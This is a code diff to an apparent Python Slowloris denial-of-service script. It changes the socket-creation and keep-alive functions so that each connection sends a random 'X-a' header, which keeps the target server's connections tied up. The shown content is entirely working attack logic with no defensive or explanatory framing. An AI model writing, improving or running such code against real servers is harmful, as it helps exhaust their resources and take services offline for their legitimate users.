@@ -40,6 +40,7 @@ def create_socket(IP, port):
 
     s.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode())
     s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
+    s.send(f"X-a {random.randint(1,255)}\r\n".encode())
     return s
 
 def slowloris(IP, port, socket_count):
@@ -62,6 +63,7 @@ def slowloris(IP, port, socket_count):
             
             for s in sockets:
                 try:
+                    
                     s.send(f"X-a {random.randint(1,255)}\r\n".encode())
                 except Exception as e:
                     sockets.remove(s)
